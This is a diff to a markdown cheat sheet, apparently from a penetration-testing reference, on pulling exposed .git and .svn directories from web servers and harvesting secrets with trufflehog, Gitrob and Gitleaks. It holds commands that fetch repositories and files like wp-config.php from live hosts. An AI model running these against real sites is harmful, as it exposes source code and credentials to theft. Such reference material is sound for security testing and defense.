@@ -1,6 +1,20 @@
-# Insecured source code management
+# Insecure source code management
+
+- [GIT - Source code management](#git---source-code-management)
+  - [Github example with a .git](#github-example-with-a-git)
+  - [Automatic way : diggit.py](#automatic-way--diggitpy)
+  - [Automatic way : rip-git](#automatic-way--rip-git)
+  - [Automatic way : GitHack](#automatic-way--githack)
+  - [Harvesting secrets : trufflehog](#harvesting-secrets--trufflehog)
+  - [Harvesting secrets : Gitrob](#harvesting-secrets--gitrob)
+  - [Harvesting secrets : Gitleaks](#harvesting-secrets--gitleaks)
+- [SVN - Source code management](#svn---source-code-management)
+  - [SVN example (Wordpress)](#svn-example-wordpress)
+  - [Automatic way : svn-extractor](#automatic-way--svn-extractor)
 
 ## GIT - Source code management
+
+The following examples will create either a copy of the .git or a copy of the current commit.
 
 ### Github example with a .git
 
@@ -63,7 +77,7 @@
 -o is a hash of particular Git object to download
 ```
 
-### Alternative way : rip-git
+### Automatic way : rip-git
 
 ```powershell
 perl rip-git.pl -v -u "http://edge1.web.*****.com/.git/"
@@ -75,6 +89,51 @@ author Michael <michael@easyctf.com> 1489389105 +0000
 committer Michael <michael@easyctf.com> 1489389105 +0000
 
 git cat-file -p 5dae937a49acc7c2668f5bcde2a9fd07fc382fe2
+```
+
+### Automatic way : GitHack
+
+```powershell
+git clone https://github.com/lijiejie/GitHack
+GitHack.py http://www.openssl.org/.git/
+```
+
+### Harvesting secrets : trufflehog
+
+> Searches through git repositories for high entropy strings and secrets, digging deep into commit history
+
+```powershell
+pip install truffleHog # https://github.com/dxa4481/truffleHog
+truffleHog --regex --entropy=False https://github.com/dxa4481/truffleHog.git
+```
+
+### Harvesting secrets : Gitrob
+
+> Gitrob is a tool to help find potentially sensitive files pushed to public repositories on Github. Gitrob will clone repositories belonging to a user or organization down to a configurable depth and iterate through the commit history and flag files that match signatures for potentially sensitive files.
+
+```powershell
+go get github.com/michenriksen/gitrob # https://github.com/michenriksen/gitrob
+export GITROB_ACCESS_TOKEN=deadbeefdeadbeefdeadbeefdeadbeefdeadbeef
+gitrob [options] target [target2] ... [targetN]
+```
+
+### Harvesting secrets - Gitleaks
+
+> Gitleaks provides a way for you to find unencrypted secrets and other unwanted data types in git source code repositories.
+
+```powershell
+# Run gitleaks against a public repository
+docker run --rm --name=gitleaks zricethezav/gitleaks -v -r  https://github.com/zricethezav/gitleaks.git
+
+# Run gitleaks against a local repository already cloned into /tmp/
+docker run --rm --name=gitleaks -v /tmp/:/code/  zricethezav/gitleaks -v --repo-path=/code/gitleaks
+
+# Run gitleaks against a specific Github Pull request
+docker run --rm --name=gitleaks -e GITHUB_TOKEN={your token} zricethezav/gitleaks --github-pr=https://github.com/owner/repo/pull/9000
+
+or
+
+go get -u github.com/zricethezav/gitleaks
 ```
 
 ## SVN - Source code management
@@ -95,7 +154,7 @@ curl http://blog.domain.com/.svn/text-base/wp-config.php.svn-base
     * use first two signs from hash as folder name inside pristine/ directory (94 in this case)
     * create complete path, which will be: `http://server/path_to_vulnerable_site/.svn/pristine/94/945a60e68acc693fcb74abadb588aac1a9135f62.svn-base`
 
-### Automatic way
+### Automatic way : svn-extractor
 
 ```powershell
 git clone https://github.com/anantshri/svn-extractor.git
@@ -104,5 +163,6 @@ python svn-extractor.py –url "url with .svn available"
 
 ## Thanks to
 
-* bl4de, https://github.com/bl4de/research/tree/master/hidden_directories_leaks
-* bl4de, https://github.com/bl4de/security-tools/tree/master/diggit
+- [bl4de, hidden_directories_leaks](https://github.com/bl4de/research/tree/master/hidden_directories_leaks)
+- [bl4de, diggit](https://github.com/bl4de/security-tools/tree/master/diggit)
+- [Gitrob: Now in Go - Michael Henriksen](https://michenriksen.com/blog/gitrob-now-in-go/)
